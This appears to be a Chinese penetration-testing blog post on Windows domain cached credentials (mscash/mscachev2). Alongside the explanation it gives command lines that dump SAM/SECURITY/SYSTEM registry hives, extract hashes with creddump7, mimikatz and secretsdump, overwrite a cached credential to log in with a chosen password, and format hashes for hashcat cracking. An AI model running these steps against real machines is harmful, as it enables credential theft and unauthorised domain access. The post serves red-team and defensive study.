---
title: "Credential Caching(域登录缓存mscash)"
date: 2020-09-28 15:32:23 +0800
category: 内网渗透
tags: [内网,MSF]
excerpt: Credential Caching(域登录缓存mscash)
---
# 域登录缓存mscash
Domain Cached Credentials 简称 DDC，也叫 mscache。有两个版本，XP/2003 年代的叫第一代，Vasta/2008 之后的是第二代。

计算机在加入域之后就得通过 kerberos 进行认证，通过 kerberos 认证就得有域控的参与，但是如果域成员暂时无法访问到域控的话，岂不是无法认证了？域凭证缓存就是为了解决这个问题的。如果暂时访问不到域控，windows 就尝试使用本机缓存的凭证进行认证，默认缓存十条。
凭据被缓存在注册表里的这些用户，在机器连不上域控的时候也可以登陆这台机器（只能交互式登陆，比如控制台或远程桌面。远程桌面的时候要注意，不能使用带有 NLA 功能的 RDP 客户端，要用老的比如 XP 上带的 RDP 客户端），但是没有被缓存在注册表里的用户是无法登陆的。

+ 缓存位置（默认本地管理员也没有权限访问）：
`HKEY_LOCAL_MACHINE\SECURITY\Cache`
![](https://ss0.baidu.com/6ONWsjip0QIZ8tyhnq/it/u=863372490,3538785821&fm=173&app=25&f=JPEG?w=640&h=306&s=F410EC3A172C550B087870CA0200F0B2)
上图的 NL$1 至 NL$10 就是 10 个可以保存凭据的注册表值。这些值都是二进制类型的，并且其中部分是加密的。
修改组策略缓存条数为0，即为不缓存。
![](https://img2018.cnblogs.com/blog/939171/201907/939171-20190721200410879-60833931.png)

+ 不同配置对 mimikatz 的影响
默认配置缓存 10 条。登陆本地管理员，提权到 system 权限，然后运行 mimikatz，成功抓到 mscachev2。
![](https://img2018.cnblogs.com/blog/939171/201907/939171-20190721200439833-1405507633.png)
设置缓存数为 0，停掉域控，然后再登陆域账号。域成员发现无法登陆了。
![](https://img2018.cnblogs.com/blog/939171/201907/939171-20190721200502382-55850987.png)
登陆本地管理员账号，提取到 system，然后什么也没抓到。
![](https://img2018.cnblogs.com/blog/939171/201907/939171-20190721200513064-1321265141.png)
## 利用工具
### cachedump
creddump是一个python写的工具，不仅能导出本地hash，还支持导出mscash（域缓存hash），下载地址https://code.google.com/p/creddump/，默认版本的creddump不支持mscash2，有人根据原版本进行修改，并命名为creddump7，可以支持所有系统版本的注册表提取mscash。下载地址：https://github.com/Neohapsis/creddump7
Creddump7在提取2003上面的mscash时可能会爆错ERR: Couldn't find subkey PolEKList of Policy，换回原版用就可以
```
//注册表导出
reg save hklm\sam sam.hive & reg save hklm\system system.hive & reg save hklm\security security.hive
//用creddump7提取mscash
cachedump.py system.hive security.hive true
//后面的第三个参数true表示这是mscash2版本，如果是2003上面提取的注册表这里写false
```
![](https://www.t00ls.net/attachment.php?aid=MzE5Mzh8NGUxY2M0MzV8MTYwMDk5NzU4OXw1Yzk3RzVSblQ0YlZPbEhQVVNUbThXemRCS1pJNFVLNkE5cS9yc3FBTTBGUUZRYw%3D%3D&noupdate=yes)
这里有两个域管理员账户，administrator和adminjk
破解之前先去查查看用户状态，要是用户最近已经改密码或者已经被禁用了那就没必要跑了。
如果是域成员计算机且当前用户是域用户，可以直接使用`net user username /domain`查看；
如果当前cmdshell不是域用户权限可以使用ldifde、adfind等工具查询，下面是ldifde的查询语法 
```
ldifde.exe -u -r "(sAMAccountName=adminjk)" -l pwdLastSet -s pdc.test.ad -b john test.ad Passw0rd. -f out.txt
```
查询完后用w32tm命令转化时间格式
下面这个是adfind的查询语句
```
AdFind.exe -u pdc.test.ad -u test.ad\john -up Passw0rd. -default -f "(sAMAccountName=adminjk)" pwdLastSet userAccountControl -int8time pwdLastSet
```
### mimikatz
```
lsadump::cache
```
+ 缓存替换
比如我们通过 lsadump::cache 看到当前机器上有一个缓存凭据：
![](https://ss1.baidu.com/6ONXsjip0QIZ8tyhnq/it/u=2013088279,1691568885&fm=173&app=25&f=JPEG?w=640&h=239&s=2072422693F0BE6154CDDD0C000070C0)
此时利用
```
lsadump::cache /user:subuser /ntlm:32ed87bdb5fdc5e9cba88547376818d4
```
就可以将缓存中保存的密码替换为 123456。
（注意缓存中保存的并不是 nt hash，这里 mimikatz 只是接收一个 nt hash 然后再将它转换成 mscache hash 而已）
更改完后，在这台机器不能连上域控的情况下，你就可以用 subuser/123456 来登陆这台机器。
> [mscache.py](https://github.com/360-A-Team/mscache)

### impacket secretsdump.py
Kali默认路径：
`/root/impacket/examples/secretsdump.py`
```
python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL
```
## hashcat破解
+ mscash
hashcat中破解mscash时的格式是：
```
f52365bd11722ddfb4429496c8785582:adminjk
```
前面是hash，后面是用户名，作为salt
hashcat破解mscash速度很快
+ mscashV2
用hashcat来跑一下，hashcat中mscash2的类型是2100。
hash格式是：
```
$DCC2$10240#adminjk#259108604cb524e8c044d5cda274bae1
```
前面的$DCC2$10240不用更改，中间是用户名，后面是hash。